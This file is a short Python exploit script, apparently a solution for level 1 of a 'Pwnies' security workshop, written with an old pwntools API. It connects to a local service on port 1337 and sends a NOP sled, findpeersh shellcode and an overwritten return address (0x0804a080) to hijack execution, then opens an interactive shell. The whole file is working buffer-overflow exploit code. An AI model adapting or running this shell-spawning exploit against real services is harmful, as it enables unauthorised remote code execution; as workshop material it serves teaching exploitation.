#!/usr/bin/env python

# Pwnies workshop server level 1

from pwn.classic import *
from pwn.i386 import nops

sock = remote('localhost', 1337, timeout = 120)
sock.recvuntil('Your output to my input? Do your best!\n')

# The port is not needed for this binary
# but it is good practice to use it, unless
# you are running through NAT
shellcode = asm(findpeersh(sock.lport))

eip = p32(0x0804a080)
sock.send(nops(0xD4 - len(shellcode)) + shellcode + eip + '\n')
sock.interactive()
